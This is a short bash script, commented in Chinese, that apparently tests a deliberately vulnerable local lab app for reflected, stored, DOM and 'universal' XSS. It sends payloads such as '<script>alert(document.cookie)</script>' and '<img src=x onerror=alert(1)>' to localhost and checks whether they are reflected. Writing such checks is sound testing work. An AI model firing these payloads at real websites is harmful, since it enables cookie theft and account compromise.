#!/bin/bash
# XSS 漏洞验证脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}XSS 漏洞验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] 存在漏洞${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 测试失败${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== XSS 测试 ===${NC}"

test_case "反射型 XSS" \
    "${BASE_URL}/xss/reflect?q=<script>alert(1)</script>" \
    "<script>alert"

test_case "存储型 XSS" \
    "${BASE_URL}/xss/stored?comment=<img src=x onerror=alert(1)>" \
    "<img|alert"

test_case "DOM XSS" \
    "${BASE_URL}/xss/dom?name=<svg onload=alert(1)>" \
    "<svg|alert"

test_case "Universal XSS" \
    "${BASE_URL}/xss/universal?payload=<script>alert(document.cookie)</script>" \
    "<script"

# 信息端点
echo -e "\n${YELLOW}[*] XSS 信息端点:${NC}"
info=$(curl -s "${BASE_URL}/xss/info" 2>/dev/null)
echo "$info" | head -10

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
